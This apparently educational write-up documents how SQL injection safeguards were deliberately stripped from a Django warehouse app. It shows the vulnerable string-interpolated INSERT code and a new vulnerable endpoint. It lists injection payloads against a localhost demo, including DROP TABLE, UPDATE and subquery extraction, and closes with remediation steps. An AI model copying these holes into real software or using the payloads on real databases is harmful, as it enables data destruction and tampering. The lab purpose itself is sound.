# SQL Injection Vulnerability Analysis & Removal of Safeguards - INSERT Focus

## ⚠️ WARNING: EDUCATIONAL PURPOSE ONLY
**These changes introduce severe security vulnerabilities and should NEVER be implemented in production systems.**

## Original SQL Injection Protections

The Django application originally had the following safeguards against SQL injection:

### 1. Parameterized Queries
**Original secure code:**
```python
cursor.execute(
    "INSERT INTO objetos (nombre, descripcion, ubicacion) VALUES (%s, %s, %s)",
    (nombre_objeto, desc, ubicacion)
)
```

**Modified vulnerable code:**
```python
query = f"INSERT INTO objetos (nombre, descripcion, ubicacion) VALUES ('{nombre_objeto}', '{desc}', '{ubicacion}')"
cursor.execute(query)
```

### 2. Django ORM Protection
The authentication system uses Django's ORM, which automatically prevents SQL injection by using parameterized queries under the hood.

### 3. Input Validation
The authentication module includes validation functions for usernames, emails, and passwords.

## Changes Made (DANGEROUS)

### 1. Modified `obtener_descripcion_objeto()` function
- **File:** `consultarRutasBodega/views.py`
- **Lines:** ~300 & ~312
- **Change:** Replaced parameterized SELECT and INSERT with direct string interpolation
- **Risk:** Allows SQL injection through the `nombre_objeto` parameter

### 2. Modified `obtener_objetos_json()` function  
- **File:** `consultarRutasBodega/views.py`
- **Line:** ~485
- **Change:** Replaced parameterized LIKE query with string interpolation
- **Risk:** Allows SQL injection through the search term parameter

### 3. Modified `guardar_consulta_en_bd()` function
- **File:** `consultarRutasBodega/views.py`  
- **Line:** ~455
- **Change:** Replaced parameterized INSERT with direct string formatting
- **Risk:** Allows SQL injection through multiple parameters

### 4. Added Vulnerable INSERT Endpoint
- **File:** `consultarRutasBodega/views.py`
- **Function:** `vulnerable_insert()`
- **URL:** `/api/vulnerable_insert/`
- **Risk:** Completely vulnerable to INSERT-based SQL injection attacks

### 5. Created INSERT-focused Demo Page
- **File:** `consultarRutasBodega/templates/consultarRutasBodega/sql_injection_demo.html`
- **URL:** `/sql_demo/`
- **Purpose:** Interactive demonstration of INSERT SQL injection vulnerabilities

## How to Test the INSERT Vulnerabilities

### 1. Visit the demo page:
```
http://localhost:8000/sql_demo/
```

### 2. Try these INSERT SQL injection payloads:

**Multi-record insertion:**
- **Nombre:** `test'), ('admin', 'X', 'X1'); --`
- **Descripción:** `T`
- **Ubicación:** `A1`

**UPDATE attack through INSERT:**
- **Nombre:** `test`
- **Descripción:** `T`  
- **Ubicación:** `A1'); UPDATE objetos SET descripcion='HACKED' WHERE id=1; --`

**DROP table attack:**
- **Descripción:** `X'); DROP TABLE objetos; --`

**Information extraction:**
- **Nombre:** `test'), ((SELECT COUNT(*) FROM consultas_rutas), 'H', 'H1'); --`

### 3. Direct API testing:
```bash
curl -X POST http://localhost:8000/api/vulnerable_insert/ \
  -d "nombre=test')%2C%20('admin'%2C%20'X'%2C%20'X1')%3B%20--" \
  -d "descripcion=T" \
  -d "ubicacion=A1"
```

## INSERT-based Attack Scenarios

1. **Multiple Record Injection:** Insert additional unauthorized records
2. **Secondary Statement Execution:** Execute UPDATE, DELETE, or DROP statements
3. **Data Exfiltration:** Use subqueries to extract data into visible fields
4. **Privilege Escalation:** Create admin users or modify permissions
5. **Database Structure Manipulation:** Alter tables, create procedures, etc.

## Why INSERT Attacks are Dangerous

1. **Stealthy:** Often don't return visible errors or data
2. **Persistent:** Malicious data stays in the database
3. **Cascading Effects:** Can trigger other operations through foreign keys
4. **Audit Trail Contamination:** Pollute logs with fake data

## Testing Results Examples

**Successful Multi-Insert:**
```sql
INSERT INTO objetos (nombre, descripcion, ubicacion) VALUES ('test'), ('admin', 'X', 'X1'); --', 'T', 'A1')
```
This inserts two records instead of one.

**Successful UPDATE Attack:**
```sql
INSERT INTO objetos (nombre, descripcion, ubicacion) VALUES ('test', 'T', 'A1'); UPDATE objetos SET descripcion='HACKED' WHERE id=1; --')
```
This inserts one record and modifies existing data.

## How to Fix (Restore Security)

1. **Use parameterized queries:**
```python
cursor.execute(
    "INSERT INTO objetos (nombre, descripcion, ubicacion) VALUES (%s, %s, %s)",
    (nombre, descripcion, ubicacion)
)
```

2. **Input validation and sanitization:**
```python
import re
def sanitize_input(user_input):
    # Remove dangerous characters
    return re.sub(r'[^\w\s-]', '', user_input)
```

3. **Use Django ORM instead of raw SQL:**
```python
from django.db import models
objeto = Objeto.objects.create(
    nombre=nombre,
    descripcion=descripcion,
    ubicacion=ubicacion
)
```

4. **Implement proper access controls and least privilege principle**

## Files Modified

- `consultarRutasBodega/views.py` - Multiple functions made vulnerable to INSERT injection
- `consultarRutasBodega/urls.py` - Added vulnerable INSERT endpoint
- `consultarRutasBodega/templates/consultarRutasBodega/sql_injection_demo.html` - INSERT-focused demo page

## Important Notes

- **INSERT vulnerabilities can be more dangerous than SELECT as they modify data**
- **Always validate and sanitize user inputs before database operations**
- **Use parameterized queries for ALL SQL operations**
- **Consider using an ORM to avoid raw SQL entirely**
- **Implement proper logging to detect suspicious activity**

## Recovery Instructions

To restore the original secure code, revert the changes made to the parameterized queries in the views.py file and remove the vulnerable endpoints.
